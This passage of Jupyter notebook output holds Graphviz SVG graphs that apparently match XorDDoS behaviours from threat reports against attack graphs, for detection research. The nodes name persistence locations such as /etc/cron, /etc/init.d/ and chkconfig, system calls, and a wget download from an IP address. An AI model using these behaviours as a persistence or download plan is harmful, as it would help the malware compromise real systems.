class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M696.14,-100.75C783.69,-96.19 918.11,-86.42 933.69,-69 943.71,-57.8 932.81,-45.99 918.55,-36.67\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"920.28,-33.63 909.9,-31.49 916.68,-39.63 920.28,-33.63\"/>\n<text text-anchor=\"middle\" x=\"960.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1012.69\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1012.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M696.02,-100.7C796.42,-95.71 964.24,-85.09 987.69,-69 995.72,-63.5 1001.29,-54.63 1005.1,-45.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1008.48,-46.84 1008.69,-36.25 1001.92,-44.4 1008.48,-46.84\"/>\n<text text-anchor=\"middle\" x=\"1027.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1144.69\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1144.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M697.15,-101.97C804.3,-98.42 993.35,-89.44 1058.69,-69 1079.28,-62.56 1100.24,-50.51 1116.32,-39.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1118.43,-42.64 1124.71,-34.11 1114.48,-36.86 1118.43,-42.64\"/>\n<text text-anchor=\"middle\" x=\"1114.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1252.69\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1252.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M697.41,-102.18C821.29,-98.69 1059.79,-89.49 1141.69,-69 1168.66,-62.25 1197.22,-49.24 1218.62,-38.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1220.41,-41.19 1227.62,-33.43 1217.14,-35 1220.41,-41.19\"/>\n<text text-anchor=\"middle\" x=\"1206.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1372.69\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1372.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M697.4,-102.37C838.36,-98.92 1133.36,-89.46 1233.69,-69 1268.08,-61.99 1305.43,-48.18 1332.75,-36.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1334.11,-40.07 1341.97,-32.96 1331.39,-33.62 1334.11,-40.07\"/>\n<text text-anchor=\"middle\" x=\"1307.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"474pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 474.09 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 470.09,-127 470.09,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"142.3\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"142.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27.3\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M110.55,-88.44C100.23,-82.85 88.96,-76.14 79.3,-69 68.28,-60.86 57.19,-50.55 48.09,-41.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"50.45,-38.81 40.97,-34.08 45.43,-43.69 50.45,-38.81\"/>\n<text text-anchor=\"middle\" x=\"96.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"99.3\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"99.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M133.6,-86.8C127.41,-74.58 119.01,-57.98 112.07,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"115.19,-42.65 107.55,-35.31 108.94,-45.81 115.19,-42.65\"/>\n<text text-anchor=\"middle\" x=\"141.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"185.3\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"185.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M152.99,-87.15C156.44,-81.47 160.17,-75.04 163.3,-69 167.22,-61.42 171.1,-52.99 174.49,-45.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"177.77,-46.48 178.48,-35.91 171.33,-43.73 177.77,-46.48\"/>\n<text text-anchor=\"middle\" x=\"188.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"287.3\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"287.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M174.14,-88.45C185.67,-82.6 198.7,-75.73 210.3,-69 226.17,-59.79 243.33,-48.76 257.42,-39.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"259.39,-42.29 265.76,-33.82 255.5,-36.47 259.39,-42.29\"/>\n<text text-anchor=\"middle\" x=\"252.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"309.3\" cy=\"-105\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"309.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"432.3\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"432.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"338pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 337.95 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 333.95,-127 333.95,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"143\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"143\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M111.29,-88.39C100.98,-82.79 89.69,-76.09 80,-69 68.67,-60.71 57.21,-50.22 47.86,-40.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"50.07,-38.25 40.55,-33.6 45.1,-43.17 50.07,-38.25\"/>\n<text text-anchor=\"middle\" x=\"97.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"99\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"99\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M134.1,-86.8C127.77,-74.58 119.18,-57.98 112.07,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"115.15,-42.58 107.44,-35.31 108.93,-45.8 115.15,-42.58\"/>\n<text text-anchor=\"middle\" x=\"141.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"187\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"187\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M153.01,-87.05C156.28,-81.36 159.88,-74.95 163,-69 167.07,-61.24 171.28,-52.68 175.02,-44.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"178.19,-46.35 179.3,-35.82 171.86,-43.36 178.19,-46.35\"/>\n<text text-anchor=\"middle\" x=\"190\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"289\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"289\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M175.83,-88.58C187.71,-82.74 201.11,-75.85 213,-69 228.72,-59.94 245.63,-48.95 259.5,-39.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"261.84,-42.22 268.13,-33.69 257.89,-36.44 261.84,-42.22\"/>\n<text text-anchor=\"middle\" x=\"253.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"636pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 635.73 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 631.73,-127 631.73,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"305.83\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"305.83\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"137.83\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"137.83\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M230.79,-100.34C147.12,-95.47 21.51,-85.5 6.83,-69 -21.89,-36.72 52.18,-25.17 100.31,-21.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"100.74,-24.59 110.44,-20.34 100.2,-17.61 100.74,-24.59\"/>\n<text text-anchor=\"middle\" x=\"43.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M230.48,-100.82C180.05,-96.93 120.05,-88.27 103.83,-69 95.81,-59.46 102.54,-48.02 112.07,-38.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"114.6,-40.92 119.7,-31.63 109.92,-35.71 114.6,-40.92\"/>\n<text text-anchor=\"middle\" x=\"126.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M239,-95.91C216.51,-90.81 192.22,-82.52 172.83,-69 163.84,-62.73 156.39,-53.36 150.72,-44.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"153.71,-42.61 145.64,-35.75 147.67,-46.14 153.71,-42.61\"/>\n<text text-anchor=\"middle\" x=\"191.33\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M276.1,-88.25C257.2,-78.29 232.16,-65.24 209.83,-54 196.38,-47.23 181.41,-39.92 168.62,-33.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"169.86,-30.45 159.33,-29.26 166.82,-36.75 169.86,-30.45\"/>\n<text text-anchor=\"middle\" x=\"265.33\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"330.83\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"330.83\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M303.79,-86.94C303.19,-77.08 303.44,-64.58 306.83,-54 308.09,-50.09 309.94,-46.22 312.06,-42.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"315.13,-44.26 317.72,-33.99 309.29,-40.4 315.13,-44.26\"/>\n<text text-anchor=\"middle\" x=\"329.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M335.78,-88.17C342.62,-83.03 349,-76.64 352.83,-69 357.19,-60.32 354.54,-50.58 349.79,-42.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"352.7,-40.07 344.29,-33.62 346.84,-43.9 352.7,-40.07\"/>\n<text text-anchor=\"middle\" x=\"377.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"461.83\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"461.83\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M353.76,-90.81C370.22,-85.27 388.38,-78 403.83,-69 416.34,-61.72 428.7,-51.58 438.78,-42.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"441.47,-44.61 446.33,-35.19 436.66,-39.53 441.47,-44.61\"/>\n<text text-anchor=\"middle\" x=\"447.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M377.58,-98.11C417.81,-93.16 462.35,-84.34 474.83,-69 480.43,-62.13 479.77,-53.11 476.85,-44.63\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"480.03,-43.17 472.8,-35.42 473.62,-45.99 480.03,-43.17\"/>\n<text text-anchor=\"middle\" x=\"505.33\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"584.83\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"584.83\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M377.26,-97.97C433.92,-92.3 507.92,-82.62 534.83,-69 546.81,-62.94 557.68,-52.93 566.2,-43.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"568.97,-45.6 572.78,-35.71 563.64,-41.06 568.97,-45.6\"/>\n<text text-anchor=\"middle\" x=\"577.83\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M59.61,-87.36C55.05,-81.99 50.75,-75.68 48.34,-69 45.06,-59.89 48.37,-50.55 53.77,-42.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"56.58,-44.53 59.97,-34.5 51.06,-40.23 56.58,-44.53\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M82.11,-86.69C83.43,-81.09 84.69,-74.82 85.34,-69 86.19,-61.52 85.57,-53.45 84.38,-46.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"87.78,-45.2 82.4,-36.07 80.92,-46.56 87.78,-45.2\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M59.61,-87.36C55.05,-81.99 50.75,-75.68 48.34,-69 45.06,-59.89 48.37,-50.55 53.77,-42.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"56.58,-44.53 59.97,-34.5 51.06,-40.23 56.58,-44.53\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M82.11,-86.69C83.43,-81.09 84.69,-74.82 85.34,-69 86.19,-61.52 85.57,-53.45 84.38,-46.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"87.78,-45.2 82.4,-36.07 80.92,-46.56 87.78,-45.2\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro2.csv\n"
     ]
    },
    {
     "data": {
